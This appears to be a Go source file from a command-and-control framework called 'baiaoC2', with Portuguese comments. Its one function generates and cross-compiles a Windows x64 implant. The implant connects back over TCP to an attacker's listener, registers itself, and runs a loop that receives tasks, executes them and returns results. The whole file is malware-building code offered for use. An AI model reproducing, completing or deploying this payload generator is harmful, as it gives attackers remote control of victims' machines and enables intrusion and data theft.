package payload

import (
	"baiaoC2/shared/crypto"
	"baiaoC2/shared/protocol"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
)

func GenerateWindowsPayload(listener Listener, outputPath string) error {
	// Gerar chave de sessão
	sessionKey := crypto.GenerateSessionKey()

	// Criar payload
	payload := fmt.Sprintf(`
package main

import (
	"baiaoC2/shared/crypto"
	"baiaoC2/shared/protocol"
	"net"
)

func main() {
	conn, err := net.Dial("tcp", "%s:%d")
	if err != nil {
		return
	}

	// Enviar chave de sessão
	err = protocol.SendSessionKey(conn, "%s", "%s")
	if err != nil {
		return
	}

	// Registrar implante
	implant := protocol.RegisterImplant(conn, "%s")

	// Processar tarefas
	for {
		task, err := protocol.ReceiveTask(conn, "%s")
		if err != nil {
			return
		}

		// Executar tarefa
		result := ExecuteTask(task)
		err = protocol.SendTaskResult(conn, result, "%s")
		if err != nil {
			return
		}
	}
}
`, listener.Host, listener.Port, hex.EncodeToString(sessionKey), listener.Key, hex.EncodeToString(sessionKey), hex.EncodeToString(sessionKey), hex.EncodeToString(sessionKey))

	// Escrever payload em um arquivo temporário
	tmpFile := "tmp_payload.go"
	err := os.WriteFile(tmpFile, []byte(payload), 0644)
	if err != nil {
		return err
	}
	defer os.Remove(tmpFile)

	// Compilar payload para Windows x64
	cmd := exec.Command("go", "build", "-o", outputPath, tmpFile)
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
	err = cmd.Run()
	if err != nil {
		return err
	}

	return nil
}
